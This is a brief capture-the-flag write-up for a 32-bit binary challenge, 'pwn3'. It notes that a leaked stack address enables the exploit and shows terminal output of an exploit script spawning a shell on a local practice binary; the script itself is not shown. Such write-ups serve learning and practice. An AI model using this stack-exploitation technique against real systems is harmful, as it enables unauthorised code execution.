# pwn3 Writeup

## Steps

Same as pilot except it is 32 bit instead of 64. Stack address is still provided and stack variable layout can be identified the same way.


## Solution 
```
$ python3 ex_pwn3.py 
[+] Starting local process './pwn3': pid 15976
b'0xffc376ce'
[*] Switching to interactive mode
$ ls
ex_pwn3.py  pwn3  pwn3.md
$ w
 06:31:39 up 28 min,  2 users,  load average: 0.32, 0.33, 0.35
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
kali              -                06:04   27:54   0.00s  0.09s lightdm --session-child 13 24
kali              -                06:04   27:54   0.00s  0.55s /usr/lib/systemd/systemd --user
$ exit
[*] Got EOF while reading in interactive
$ 
[*] Process './pwn3' stopped with exit code 0 (pid 15976)
[*] Got EOF while sending in interactive
```
